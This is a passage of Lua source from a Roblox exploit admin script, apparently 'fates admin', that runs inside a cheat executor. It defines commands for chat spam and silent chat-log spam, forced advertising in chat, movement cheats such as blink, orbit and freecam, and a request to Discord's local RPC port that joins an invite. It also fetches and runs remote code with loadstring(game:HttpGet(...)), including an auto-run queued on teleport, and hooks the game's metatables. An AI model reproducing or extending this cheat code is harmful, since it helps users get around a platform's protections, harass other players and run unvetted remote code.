		Animation.AnimationId = "rbxassetid://" .. Anims[Args[1]]
		local LoadedAnimation = Humanoid.LoadAnimation(Humanoid, Animation);
		LoadedAnimation.Play(LoadedAnimation);
		local Playing = CConnect(GetPropertyChangedSignal(LoadedAnimation, "IsPlaying"), function()
			if (LoadedAnimation.IsPlaying ~= true) then
				LoadedAnimation.Play(LoadedAnimation, .1, 1, 10);
			end
		end)
		return "playing animation " .. Args[1]
	end)

	AddCommand("lastcommand", {"lastcmd"}, "executes the last command", {}, function(Caller)
		local Command = LastCommand[#LastCommand]
		ExecuteCommand(Command[1], Command[2], Command[3]);
		return format("command %s executed", Command[1]);
	end)

	AddCommand("whisper", {}, "whispers something to another user", {"2"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local Message = concat(shift(Args), " ");
		local ChatRemote = Services.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
		for i, v in next, Target do
			ChatRemote.FireServer(ChatRemote, format("/w %s %s", v.Name, Message), "All");
			Utils.Notify(Caller or LocalPlayer, "Command", "Message sent to " .. v.Name);
		end
	end)

	AddCommand("chat", {}, "sends a message", {"1"}, function(Caller, Args)
		local ChatRemote = Services.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
		local toChat = concat(Args, " ");
		ChatRemote.FireServer(ChatRemote, toChat, "All");
		return "chatted " .. toChat
	end)

	AddCommand("spam", {"spamchat", "spamc"}, "spams the chat with a message", {"1"}, function(Caller, Args, CEnv)
		local WaitTime = CEnv.WaitTime or tonumber(Args[#Args]);
		if (tonumber(Args[#Args])) then
			Args = pack(unpack(Args, 1, #Args - 1));
			Args.n = nil
		end
		local Message = concat(Args, " ");
		CEnv.Spamming = true
		CEnv.WaitTime = WaitTime or 1
		local ChatRemote = Services.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
		CThread(function()
			while (CEnv.Spamming) do
				ChatRemote.FireServer(ChatRemote, Message, "All");
				wait(CEnv.WaitTime);
			end
		end)()
		return format("spamming %s with a delay of %d", Message, CEnv.WaitTime);
	end)

	AddCommand("spamspeed", {"sspeed"}, "sets your spam speed", {"1"}, function(Caller, Args)
		local Speed = tonumber(Args[1]);
		if (not Speed) then
			return "number expected"
		end
		LoadCommand("spam").CmdEnv.WaitTime = Speed
		return "spamspeed set at " .. Speed
	end)

	AddCommand("silentchat", {"chatsilent"}, "sends a message but will not show in the chat (fires .Chatted signals)", {"1"}, function(Caller, Args)
		local toChat = concat(Args, " ");
		Services.Players.Chat(Services.Players, toChat);
		return "silent chatted " .. toChat
	end)

	AddCommand("spamsilentchat", {"spamchatlogs"}, "spams sending messages with what you want", {"1"}, function(Caller, Args, CEnv)
		local toChat = concat(Args, " ");
		local ChatMsg = Services.Players.Chat
		for i = 1, 100 do
			ChatMsg(Services.Players, toChat);
		end
		AddConnection(CConnect(Players.Chatted, function()
			for i = 1, 30 do
				ChatMsg(Players, toChat);
			end
		end), CEnv);
		return "spamming chat sliently"
	end)

	AddCommand("unspamsilentchat", {"nospamsilentchat", "unspamchatlogs", "nospamchatlogs", "unspamchat", "unspam"}, "stops the spam of chat", {}, function()
		local Spamming = LoadCommand("spamsilentchat").CmdEnv
		local Spamming1 = LoadCommand("spam").CmdEnv
		if (not next(Spamming) and not next(Spamming1)) then
			return "you are not spamming chat"
		end
		DisableAllCmdConnections("spamsilentchat");
		Spamming1.Spamming = false
		return "stopped spamming chat"
	end)

	AddCommand("advertise", {}, "advertises the script", {}, function()
		local ChatRemote = Services.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
		ChatRemote.FireServer(ChatRemote, "I am using fates admin, join the server 5epGRYR", "All");
	end)

	AddCommand("joinserver", {"discord"}, "joins the fates admin discord server", {}, function()
		local Request = syn and syn.request or request
		local HttpService = Services.HttpService
		if (Request({
			Url = "http://127.0.0.1:6463/rpc?v=1",
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
				["Origin"] = "https://discord.com"
			},
			Body = JSONEncode(HttpService, {
				cmd = "INVITE_BROWSER",
				args = {
					code = "5epGRYR"
				},
				nonce = GenerateGUID(HttpService, false)
			}),
			}).StatusCode == 200) then
			return "joined fates admin discord server"
		else
			return "discord isn't open"
		end
	end)

	AddCommand("rejoin", {"rj"}, "rejoins the game you're currently in", {}, function(Caller)
		if (Caller == LocalPlayer) then
			local TeleportService = Services.TeleportService
			if (#GetPlayers(Players) == 1) then
				TeleportService.Teleport(TeleportService, game.PlaceId);
			else
				TeleportService.TeleportToPlaceInstance(TeleportService, game.PlaceId, game.JobId)
			end
			return "Rejoining..."
		end
	end)

	AddCommand("serverhop", {"sh"}, "switches servers (optional: min, max or mid)", {{"min", "max", "mid"}}, function(Caller, Args)
		if (Caller == LocalPlayer) then
			Utils.Notify(Caller or LocalPlayer, "Command", "Looking for servers...");

			local TeleportService = Services.TeleportService;
			local Info = JSONDecode(Services.HttpService, game.HttpGetAsync(game, format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100", game.PlaceId)));
			local Servers = Info.data;

			if #Servers == 0 then return "no servers found" end;

			Servers = filter(Servers, function(i,v) 
				return v.playing ~= v.maxPlayers and v.id ~= game.JobId;
			end);

			-- Theres a very small chance a game can be that popular however we better be safe. (cough adopt me)
			while #Servers == 0 do 
				Info = JSONDecode(Services.HttpService, game.HttpGetAsync(game, format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&cursor=%s", game.PlaceId, Info.nextPageCursor)));
				Servers = filter(Info.data, function() 
					return v.playing < v.maxPlayers and v.id ~= game.JobId;
				end);
			end;

			local Option, Server = lower(Args[1] or "");
			if Option == "min" then
				Server = Servers[#Servers];
			elseif Option == "max" then
				Server = Servers[1];
			elseif Option == "mid" then
				Server = Servers[floor(#Servers / 2 + .5)];
			else
				Server = Servers[random(1, #Servers)];
			end;

			local queue_on_teleport = syn and syn.queue_on_teleport or queue_on_teleport
			if (queue_on_teleport) then
				queue_on_teleport("loadstring(game.HttpGet(game, \"https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua\"))()");
			end;

			TeleportService.TeleportToPlaceInstance(TeleportService, game.PlaceId, Server.id);
			return format("joining server (%d/%d players)", Server.playing, Server.maxPlayers);
		end;
	end);

	AddCommand("changelogs", {"cl"}, "shows you the updates on fates admin", {}, function()
		local ChangeLogs = JSONDecode(Services.HttpService, game.HttpGetAsync(game, "https://api.github.com/repos/fatesc/fates-admin/commits?per_page=100&path=main.lua"));
		ChangeLogs = map(ChangeLogs, function(i, v)
			return {
				["Author"] = v.commit.author.name,
				["Date"] = gsub(v.commit.committer.date, "[T|Z]", " "),
				["Message"] = v.commit.message
			}
		end)
		for i, v in next, ChangeLogs do
			Utils.Print(format("Author: %s\nDate: %s\nMessage: %s", v.Author, v.Date, v.Message));
		end

		return "changelogs loaded, press f9"
	end)

	AddCommand("whitelist", {"wl"}, "whitelists a user so they can use commands", {"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		for i, v in next, Target do
			AdminUsers[#AdminUsers + 1] = v
			Utils.Notify(v, "Whitelisted", format("You (%s) are whitelisted to use commands", v.Name));
		end
	end)

	AddCommand("whitelisted", {"whitelistedusers"}, "shows all the users whitelisted to use commands", {}, function(Caller)
		return next(AdminUsers) and concat(map(AdminUsers, function(i,v) return v.Name end), ", ") or "no users whitelisted"
	end)

	AddCommand("blacklist", {"bl"}, "blacklists a whitelisted user", {"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		for i, v in next, Target do
			if (Tfind(AdminUsers, v)) then
				AdminUsers[indexOf(AdminUsers, v)] = nil
			end
		end
	end)

	AddCommand("exceptions", {}, "blocks user from being used in stuff like kill all", {"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		for i, v in next, Target do
			Exceptions[#Exceptions + 1] = v
			Utils.Notify(Caller, "Command", v.Name .. " is added to the exceptions list");
		end
	end)

	AddCommand("noexception", {}, "removes user from exceptions list", {"1"}, function(Caller, Args)
		for i2, v2 in next, Exceptions do
			if (v2.Name == Args[1]) then
				v2 = nil
			end
			Utils.Notify(Caller, "Command", Args[1] .. " is removed from the exceptions list");
		end
	end)

	AddCommand("clearexceptions", {}, "removes users from exceptions list", {}, function(Caller, Args)
		Exceptions = {}
		return "exceptions list cleared"
	end)
	local CommandsLoaded = false
	AddCommand("commands", {"cmds"}, "shows you all the commands listed in fates admin", {}, function()
		if (not CommandsLoaded) then
			local CommandsList = Commands.Frame.List
			Utils.SmoothScroll(CommandsList, .14);
			for _, v in next, CommandsTable do
				if (not FindFirstChild(CommandsList, v.Name)) then
					local Clone = Clone(Command)
					Utils.Hover(Clone, "BackgroundColor3");
					Utils.ToolTip(Clone, v.Name .. "\n" .. v.Description);
					Clone.CommandText.Text = v.Name .. (#v.Aliases > 0 and " (" ..concat(v.Aliases, ", ") .. ")" or "");
					Clone.Name = v.Name
					Clone.Visible = true
					Clone.Parent = CommandsList
				end
			end
			Commands.Frame.List.CanvasSize = UDim2.fromOffset(0, Commands.Frame.List.UIListLayout.AbsoluteContentSize.Y);
			CommandsTransparencyClone = Clone(Commands);
			Utils.SetAllTrans(Commands)
			CommandsLoaded = true
		end
		Commands.Visible = true
		Utils.TweenAllTransToObject(Commands, .25, CommandsTransparencyClone);
		return "Commands Loaded"
	end)

	AddCommand("killscript", {}, "kills the script", {}, function(Caller)
		if (Caller == LocalPlayer) then
			deepsearch(Connections, function(i,v)
				if (type(v) == 'userdata' and v.Disconnect) then
					Disconnect(v);
				elseif (type(v) == 'boolean') then
					v = false
				end
			end);
			for i, v in next, Hooks.SpoofedProperties do
				for i2, v2 in next, v do
					i[v2.Property] = v2.SpoofedProperty[v2.Property]
				end
			end
			for i, v in next, Hooks do
				if (type(v) == 'boolean') then
					v = false
				end
				if (type(v) == 'function') then

				end
			end
			Destroy(UI);
			getgenv().F_A = nil
			setreadonly(mt, false);
			mt = OldMetaMethods
			setreadonly(mt, true);
			for i, v in next, getfenv() do
				getfenv()[i] = nil
			end
		end
	end)

	AddCommand("reloadscript", {}, "kills the script and reloads it", {}, function(Caller)
		if (Caller == LocalPlayer) then
			ExecuteCommand("killscript", {}, LocalPlayer);
			loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
		end
	end)

	AddCommand("commandline", {"cmd", "cli"}, "brings up a cli, can be useful for when games detect by textbox", {}, function()
		if (not _L.CLI) then
			_L.CLI = true
			while true do
				rconsoleprint("@@WHITE@@");
				rconsoleprint("CMD >");
				local Input = rconsoleinput("");
				local CommandArgs = split(Input, " ");
				local Command = LoadCommand(CommandArgs[1]);
				local Args = shift(CommandArgs);
				if (Command and CommandArgs[1] ~= "") then
					if (Command.ArgsNeeded > #Args) then
						rconsoleprint("@@YELLOW@@");
						return rconsoleprint(format("Insuficient Args (you need %d)\n", Command.ArgsNeeded));
					end

					local Success, Err = pcall(function()
						local Executed = Command.Function()(LocalPlayer, Args, Command.CmdEnv);
						if (Executed) then
							rconsoleprint("@@GREEN@@");
							rconsoleprint(Executed .. "\n");
						end
						if (#LastCommand == 3) then
							LastCommand = shift(LastCommand);
						end
						LastCommand[#LastCommand + 1] = {Command, plr, Args, Command.CmdEnv}
					end);
					if (not Success and Debug) then
						rconsoleerr(Err);
					end
				else
					rconsolewarn("couldn't find the command " .. CommandArgs[1] .. "\n");
				end
			end
		end
	end)

	AddCommand("setprefix", {}, "changes your prefix", {"1"}, function(Caller, Args)
		local PrefixToSet = Args[1]
		if (match(PrefixToSet, "%A")) then
			Prefix = PrefixToSet
			Utils.Notify(Caller, "Command", format("your new prefix is now '%s'", PrefixToSet));
			return "use command saveprefix to save your prefix"
		else
			return "prefix must be a symbol"
		end
	end)

	AddCommand("setcommandbarprefix", {"setcprefix"}, "sets your command bar prefix to whatever you input", {}, function()
		ChooseNewPrefix = true
		local CloseNotif = Utils.Notify(LocalPlayer, "New Prefix", "Input the new prefix you would like to have", 7);
	end)

	AddCommand("saveprefix", {}, "saves your prefix", {}, function(Caller, Args)
		if (GetConfig().Prefix == Prefix and Enum.KeyCode[GetConfig().CommandBarPrefix] == CommandBarPrefix) then
			return "nothing to save, prefix is the same"
		else
			SetConfig({["Prefix"]=Prefix,["CommandBarPrefix"]=split(tostring(CommandBarPrefix), ".")[3]});
			return "saved prefix"
		end
	end)

	AddCommand("clear", {"clearcli", "cls"}, "clears the commandline (if open)", {}, function()
		if (_L.CLI) then
			rconsoleclear();
			rconsolename("Admin Command Line");
			rconsoleprint("\nCommand Line:\n");
			return "cleared console"
		end
		return "cli is not open"
	end)

	AddCommand("widebar", {}, "widens the command bar (toggle)", {}, function(Caller, Args)
		WideBar = not WideBar
		if (not Draggable) then
			Utils.Tween(CommandBar, "Quint", "Out", .5, {
				Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween -110
			})
		end
		Utils.Tween(CommandBar, "Quint", "Out", .5, {
			Size = UDim2.new(0, WideBar and 400 or 200, 0, 35) -- tween -110
		})
		return format("widebar %s", WideBar and "enabled" or "disabled")
	end)

	AddCommand("draggablebar", {"draggable"}, "makes the command bar draggable", {}, function(Caller)
		Draggable = not Draggable
		CommandBarOpen = not CommandBarOpen
		Utils.Tween(CommandBar, "Quint", "Out", .5, {
			Position = UDim2.new(0, Mouse.X, 0, Mouse.Y + 36);
		})
		Utils.Draggable(CommandBar);
		local TransparencyTween = CommandBarOpen and Utils.TweenAllTransToObject or Utils.TweenAllTrans
		local Tween = TransparencyTween(CommandBar, .5, CommandBarTransparencyClone)
		CommandBar.Input.Text = ""
		return format("draggable command bar %s", Draggable and "enabled" or "disabled")
	end)

	local ToggleChatPrediction
	AddCommand("chatprediction", {}, "enables command prediction on the chatbar", {}, function()
		ToggleChatPrediction();
		local ChatBar = WaitForChild(_L.Frame2, "ChatBar", .1);
		ChatBar.CaptureFocus(ChatBar);
		wait();
		ChatBar.Text = Prefix
		return "chat prediction enabled"
	end)

	AddCommand("blink", {"blinkws"}, "cframe speed", {}, function(Caller, Args, CEnv)
		local Speed = tonumber(Args[1]) or 5
		local Time = tonumber(Args[2]) or .05
		LoadCommand("blink").CmdEnv[1] = Speed
		CThread(function()
			while (next(LoadCommand("blink").CmdEnv) and wait(Time)) do
				Speed = LoadCommand("blink").CmdEnv[1]
				if (Keys["W"] or Keys["A"] or Keys["S"] or Keys["D"]) then
					GetRoot().CFrame = GetRoot().CFrame + GetHumanoid().MoveDirection * Speed
				end
			end
		end)();
		return "blink speed enabled"
	end)

	AddCommand("unblink", {"noblinkws", "unblink", "noblink"}, "stops cframe speed", {}, function()
		local Blink = LoadCommand("blink").CmdEnv
		if (not next(Blink)) then
			return "blink is already disabled"
		end
		LoadCommand("blink").CmdEnv = {}
		return "blink speed disabled"
	end)

	AddCommand("orbit", {}, "orbits a yourself around another player", {3, "1"}, function(Caller, Args, CEnv)
		local Target = GetPlayer(Args[1])[1];
		if (Target == LocalPlayer) then
			return "You cannot orbit yourself."
		end
		local Radius = tonumber(Args[3]) or 7
		local Speed = tonumber(Args[2]) or 1
		local random = random(tick() / 2, tick());
		local Root, TRoot = GetRoot(), GetRoot(Target);
		AddConnection(CConnect(Heartbeat, function()
			Root.CFrame = CFrameNew(TRoot.Position + Vector3New(sin(tick() * Speed) * Radius, 0, cos(tick() * Speed) * Radius), TRoot.Position);
		end), CEnv);
		return "now orbiting around " .. Target.Name
	end)

	AddCommand("unorbit", {"noorbit"}, "unorbits yourself from the other player", {}, function()
		if (not next(LoadCommand("orbit").CmdEnv)) then
			return "you are not orbiting around someone"
		end
		DisableAllCmdConnections("orbit");
		return "orbit stopped"
	end)

	-- AddCommand("bypass", {"clientbypass"}, "client sided bypass", {3}, function()
	--     AddConnection(CConnect(LocalPlayer.CharacterAdded, function()
	--         WaitForChild(GetCharacter(), "Humanoid");
	--         wait(.4);
	--         SpoofInstance(GetHumanoid());
	--         SpoofInstance(GetRoot(), isR6() and GetCharacter().Torso or GetCharacter().UpperTorso);
	--         ProtectInstance(GetRoot());
	--         ProtectInstance(GetHumanoid());
	--     end));
	--     local Char = GetCharacter();
	--     Char.BreakJoints(Char);
	--     CommandsTable["goto"].Function = CommandsTable["tweento"].Function
	--     CommandsTable["to"].Function = CommandsTable["tweento"].Function
	--     return "clientsided bypass enabled"
	-- end)

	AddCommand("shiftlock", {}, "enables shiftlock in your game (some games have it off)", {}, function()
		if (LocalPlayer.DevEnableMouseLock) then
			return "shiftlock is already on"
		end
		LocalPlayer.DevEnableMouseLock = true
		return "shiftlock is now on"
	end)

	AddCommand("copyname", {"copyusername"}, "copies a users name to your clipboard", {"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1])[1];
		if (setclipboard) then
			setclipboard(Target.Name);
		else
			Frame2.Chatbar.CaptureFocus(Frame2.Chatbar);
			wait();
			Frame2.Chatbar.Text = Target.Name
		end
		return "copied " .. Target.Name .. "'s username"
	end)

	AddCommand("copyid", {"copyuserid", "copyuid"}, "copies someones userid to your clipboard", {"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1])
		if (setclipboard and Target[1]) then
			setclipboard(Target.UserId);
			return format("copied %s' userid", Target.Name);
		end
		return "exploit doesn't have copy clipboard support"
	end)

	AddCommand("switchteam", {"team"}, "switches your team", {}, function(Caller, Args)
		local Team = Args[1]
		Team = FindFirstChild(Services.Teams, Team);
		if (not Team) then
			return Team.. " is not a valid team"
		end
		for i, v in next, GetDescendants(Services.Workspace) do
			if (IsA(v, "SpawnLocation") and v.BrickColor == Team.TeamColor) then
				firetouchinterest(v, GetRoot(), 0);
				firetouchinterest(v, GetRoot(), 1);
				break
			end
		end
		wait(.1);
		return LocalPlayer.Team == Team and "changed team to " .. Team.Name or "could'nt change team to " .. Team.Name
	end)

	AddCommand("freecam", {"fc"}, "enables/disables freecam", {}, function(Caller, Args, CEnv)
		if (not CEnv.Activated) then
			-- roblox freecam modifed by fate
			local Spring = {}
			Spring.__index = Spring
			function Spring:Update(dt)
				local t, k, d, x0, v0 = self.t, self.k, self.d, self.x, self.v
				local a0 = k * (t - x0) + v0 * d
				local v1 = v0 + a0 * (dt / 2);
				local a1 = k * (t - (x0 + v0 * (dt / 2))) + v1 * d
				local v2 = v0 + a1 * (dt / 2);
				local a2 = k * (t - (x0 + v1 * (dt / 2))) + v2 * d
				local v3 = v0 + a2 * dt
				local x4 = x0 + (v0 + 2 * (v1 + v2) + v3) * (dt / 6);
				self.x, self.v = x4, v0 + (a0 + 2 * (a1 + a2) + k * (t - (x0 + v2 * dt)) + v3 * d) * (dt / 6);
				return x4
			end
			function Spring.new(stiffness, dampingCoeff, dampingRatio, initialPos)
				local self = setmetatable({}, Spring);

				dampingRatio = dampingRatio or 1
				local m = dampingCoeff * dampingCoeff / (4 * stiffness * dampingRatio * dampingRatio);
				self.k = stiffness / m
				self.d = -dampingCoeff / m
				self.x = initialPos
				self.t = initialPos
				self.v = initialPos * 0

				return self
			end
			local StarterGui = Services.StarterGui
			local UserInputService = Services.UserInputService
			local RunService = Services.RunService

			local WasGuiVisible = {}
			local GetCore, GetCoreGuiEnabled, SetCore, SetCoreGuiEnabled = StarterGui.GetCore, StarterGui.GetCoreGuiEnabled, StarterGui.SetCore, StarterGui.SetCoreGuiEnabled
			local CoreGuiType = Enum.CoreGuiType
			function ToggleGui(on)
				if not on then
					WasGuiVisible["PointsNotificationsActive"] = GetCore(StarterGui, "PointsNotificationsActive");
					WasGuiVisible["BadgesNotificationsActive"] = GetCore(StarterGui, "BadgesNotificationsActive");
					WasGuiVisible["Health"] = GetCoreGuiEnabled(StarterGui, CoreGuiType.Health);
					WasGuiVisible["Backpack"] = GetCoreGuiEnabled(StarterGui, CoreGuiType.Backpack);
					WasGuiVisible["PlayerList"] = GetCoreGuiEnabled(StarterGui, CoreGuiType.PlayerList);
					WasGuiVisible["Chat"] = GetCoreGuiEnabled(StarterGui, CoreGuiType.Chat);
				end

				local function GuiOn(name)
					if on == false then
						return false
					end
					if WasGuiVisible[name] ~= nil then
						return WasGuiVisible[name]
					end
					return true
				end

				SetCore(StarterGui, "PointsNotificationsActive", GuiOn("PointsNotificationsActive"));
				SetCore(StarterGui, "BadgesNotificationsActive", GuiOn("BadgesNotificationsActive"));

				SetCoreGuiEnabled(StarterGui, CoreGuiType.Health, GuiOn("Health"));
				SetCoreGuiEnabled(StarterGui, CoreGuiType.Backpack, GuiOn("Backpack"));
				SetCoreGuiEnabled(StarterGui, CoreGuiType.PlayerList, GuiOn("PlayerList"));
				SetCoreGuiEnabled(StarterGui, CoreGuiType.Chat, GuiOn("Chat"));
			end

			local Vector2New = Vector2.new

			local DEF_FOV = 70
			local NM_ZOOM = math.tan(DEF_FOV * math.pi/360);
			local LVEL_GAIN = Vector3New(1, 0.75, 1);
			local RVEL_GAIN = Vector2New(0.85, 1) / 128
			local FVEL_GAIN = -330
			local DEADZONE = 0.125
			local FOCUS_OFFSET = CFrameNew(0, 0, -16);

			local DIRECTION_LEFT = 1
			local DIRECTION_RIGHT = 2
			local DIRECTION_FORWARD = 3
			local DIRECTION_BACKWARD = 4
			local DIRECTION_UP = 5
			local DIRECTION_DOWN = 6

			local KEY_MAPPINGS = {
				[DIRECTION_LEFT] = {Enum.KeyCode.A, Enum.KeyCode.H},
				[DIRECTION_RIGHT] = {Enum.KeyCode.D, Enum.KeyCode.K},
				[DIRECTION_FORWARD] = {Enum.KeyCode.W, Enum.KeyCode.U},
				[DIRECTION_BACKWARD] = {Enum.KeyCode.S, Enum.KeyCode.J},
				[DIRECTION_UP] = {Enum.KeyCode.E, Enum.KeyCode.I},
				[DIRECTION_DOWN] = {Enum.KeyCode.Q, Enum.KeyCode.Y},
			}

			local screenGuis = {}
			local freeCamEnabled = false

			local V3, V2 = Vector3New(), Vector2New();

			local stateRot = V2
			local panDeltaGamepad = V2
			local panDeltaMouse = V2

			local velSpring = Spring.new(7 / 9, 1 / 3, 1, V3);
			local rotSpring = Spring.new(7 / 9, 1 / 3, 1, V2);
			local fovSpring = Spring.new(2, 1 / 3, 1, 0);

			local gp_x  = 0
			local gp_z  = 0
			local gp_l1 = 0
			local gp_r1 = 0
			local rate_fov = 0

			local SpeedModifier = 1

			local function Clamp(x, min, max)
				return x < min and min or x > max and max or x
			end

			local function GetChar()
				local Char = GetCharacter();
				if Char then
					return FindFirstChildOfClass(Char, "Humanoid"), FindFirstChild(Char, "HumanoidRootPart");
				end
			end

			local function InputCurve(x)
				local s = abs(x);
				if s > DEADZONE then
					s = 0.255000975 * (2 ^ (2.299113817 * s) - 1);
					return x > 0 and (s > 1 and 1 or s) or (s > 1 and -1 or -s);
				end
				return 0
			end

			local function ProcessInput(input, processed)
				local userInputType = input.UserInputType
				Processed = processed
				if userInputType == Enum.UserInputType.Gamepad1 then
					local keycode = input.KeyCode
					if keycode == Enum.KeyCode.Thumbstick2 then
						local pos = input.Position
						panDeltaGamepad = Vector2.new(InputCurve(pos.y), InputCurve(-pos.x)) * 7
					elseif keycode == Enum.KeyCode.Thumbstick1 then
						local pos = input.Position
						gp_x = InputCurve(pos.x)
						gp_z = InputCurve(-pos.y)
					elseif keycode == Enum.KeyCode.ButtonL2 then
						gp_l1 = input.Position.z
					elseif keycode == Enum.KeyCode.ButtonR2 then
						gp_r1 = input.Position.z
					end

					rate_fov = input.Position.Z
				end
			end
			CEnv.Connections = {}
			AddConnection(CConnect(UserInputService.InputChanged, ProcessInput));
			AddConnection(CConnect(UserInputService.InputEnded, ProcessInput));
			AddConnection(CConnect(UserInputService.InputBegan, ProcessInput));
			local IsKeyDown = UserInputService.IsKeyDown
			local function IsDirectionDown(direction)
				for i = 1, #KEY_MAPPINGS[direction] do
					if (IsKeyDown(UserInputService, KEY_MAPPINGS[direction][i]) and not Processed) then
						return true
					end
				end
				return false
			end

			local UpdateFreecam do
				local dt = 1/60
				AddConnection(CConnect(RenderStepped, function(_dt)
					dt = _dt
				end));

				function UpdateFreecam()
					local camCFrame = Camera.CFrame

					local kx = (IsDirectionDown(DIRECTION_RIGHT) and 1 or 0) - (IsDirectionDown(DIRECTION_LEFT) and 1 or 0);
					local ky = (IsDirectionDown(DIRECTION_UP) and 1 or 0) - (IsDirectionDown(DIRECTION_DOWN) and 1 or 0);
					local kz = (IsDirectionDown(DIRECTION_BACKWARD) and 1 or 0) - (IsDirectionDown(DIRECTION_FORWARD) and 1 or 0);
					local km = (kx * kx) + (ky * ky) + (kz * kz)
					if km > 1e-15 then
						km = ((IsKeyDown(UserInputService, Enum.KeyCode.LeftShift) or IsKeyDown(UserInputService, Enum.KeyCode.RightShift)) and 1 / 4 or 1) / math.sqrt(km);
						kx = kx * km
						ky = ky * km
						kz = kz * km
					end

					local dx = kx + gp_x
					local dy = ky + gp_r1 - gp_l1
					local dz = kz + gp_z

					velSpring.t = Vector3New(dx, dy, dz) * SpeedModifier
					rotSpring.t = panDeltaMouse + panDeltaGamepad
					fovSpring.t = Clamp(fovSpring.t + dt * rate_fov*FVEL_GAIN, 5, 120);

					local fov  = fovSpring:Update(dt);
					local dPos = velSpring:Update(dt) * LVEL_GAIN
					local dRot = rotSpring:Update(dt) * (RVEL_GAIN * math.tan(fov * math.pi / 360) * NM_ZOOM);

					rate_fov = 0
					panDeltaMouse = V2

					stateRot = stateRot + dRot
					stateRot = Vector2New(Clamp(stateRot.x, -3 / 2, 3 / 2), stateRot.y);

					local c = CFrameNew(camCFrame.p) * CFrame.Angles(0, stateRot.y, 0) * CFrame.Angles(stateRot.x, 0, 0) * CFrameNew(dPos);

					Camera.CFrame = c
					Camera.Focus = c * FOCUS_OFFSET
					Camera.FieldOfView = fov
				end
			end

			local function Panned(input, processed)
				if not processed and input.UserInputType == Enum.UserInputType.MouseMovement then
					local delta = input.Delta
					panDeltaMouse = Vector2New(-delta.y, -delta.x);
				end
			end

			local function EnterFreecam()
				ToggleGui(false);
				UserInputService.MouseIconEnabled = false
				AddConnection(CConnect(UserInputService.InputBegan, function(input, processed)
					if input.UserInputType == Enum.UserInputType.MouseButton2 then
						UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
						local conn = CConnect(UserInputService.InputChanged, Panned)
						repeat
							input = CWait(UserInputService.InputEnded);
						until input.UserInputType == Enum.UserInputType.MouseButton2 or not freeCamEnabled
						panDeltaMouse = V2
						panDeltaGamepad = V2
						Disconnect(conn);
						if freeCamEnabled then
							UserInputService.MouseBehavior = Enum.MouseBehavior.Default
						end
					elseif input.KeyCode == Enum.KeyCode.LeftShift or input.KeyCode == Enum.KeyCode.RightShift then
						SpeedModifier = 0.5
					end
				end), CEnv.Connections);

				AddConnection(CConnect(UserInputService.InputEnded, function(input, processed)
					if input.KeyCode == Enum.KeyCode.LeftShift or input.KeyCode == Enum.KeyCode.RightShift then
						SpeedModifier = 1
					end
				end), CEnv.Connections);

				Camera.CameraType = Enum.CameraType.Scriptable

				local hum, hrp = GetChar()
				if hrp then
					hrp.Anchored = true
				end
				if hum then
					hum.WalkSpeed = 0
					AddConnection(CConnect(hum.Jumping, function(active)
						if active then
							hum.Jumping = false
						end
					end), CEnv.Connections);
				end

				velSpring.t, velSpring.v, velSpring.x = V3, V3, V3
				rotSpring.t, rotSpring.v, rotSpring.x = V2, V2, V2
				fovSpring.t, fovSpring.v, fovSpring.x = Camera.FieldOfView, 0, Camera.FieldOfView

				local camCFrame = Camera.CFrame
				local lookVector = camCFrame.lookVector.unit

				stateRot = Vector2.new(
					math.asin(lookVector.y),
					math.atan2(-lookVector.z, lookVector.x) - math.pi/2
				)
				panDeltaMouse = Vector2New();
				for _, obj in next, GetChildren(PlayerGui) do
					if IsA(obj, "ScreenGui") and obj.Enabled then
						obj.Enabled = false
						screenGuis[obj] = true
					end
				end

				AddConnection(CConnect(LocalPlayer.CharacterAdded, function()
					local Hrp = WaitForChild(LocalPlayer.Character, "HumanoidRootPart");
					Hrp.Anchored = true
				end), CEnv.Connections);
				RunService.BindToRenderStep(RunService, "Freecam", Enum.RenderPriority.Camera.Value, UpdateFreecam);
				CEnv.Enabled = true
			end

			local function ExitFreecam()
				CEnv.Enabled = false
				UserInputService.MouseIconEnabled = true
				UserInputService.MouseBehavior = Enum.MouseBehavior.Default

				RunService.UnbindFromRenderStep(RunService, "Freecam")
				local hum, hrp = GetChar()
				if hum then
					hum.WalkSpeed = 16
				end
				if hrp then
					hrp.Anchored = false
				end
				Camera.FieldOfView = DEF_FOV
				Camera.CameraType = Enum.CameraType.Custom
				for i, Connection in next, CEnv.Connections do
					Disconnect(Connection);
				end
				for obj in next, screenGuis do
					obj.Enabled = true
				end
				screenGuis = {}
				ToggleGui(true)
			end

			EnterFreecam()
			CEnv.Activated = true
			CEnv.Enabled = true
			CEnv.EnterFreecam = EnterFreecam
			CEnv.ExitFreecam = ExitFreecam
			return "freecam enabled"
		end
		if (CEnv.Enabled) then
			CEnv.ExitFreecam();
			return "freecam disabled"
		else
			CEnv.EnterFreecam();
			return "freecam enabled"
		end
	end)

	AddCommand("freecamgoto", {"fcgoto"}, "takes your freecam to t hem", {"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local Delay = tonumber(Args[2]);
		for i, v in next, Target do
			if (Delay) then
				wait(Delay);
			end
			Camera.CFrame = GetRoot(v).CFrame * CFrameNew(0, 10, 10);
		end
	end)

	AddCommand("plastic", {"fpsboost"}, "changes everything to a plastic material", {}, function(Caller, Args, CEnv)
		local time = tick();
		local Plasticc = 0
		for i, v in next, GetDescendants(Workspace) do
			if (IsA(v, "Part") and v.Material ~= Enum.Material.Plastic) then
				CEnv[v] = v.Material
				v.Material = Enum.Material.Plastic
				Plasticc = Plasticc + 1
			end
		end
		return format("%d items made plastic in %.3f (s)", Plasticc, (tick()) - time);
	end)

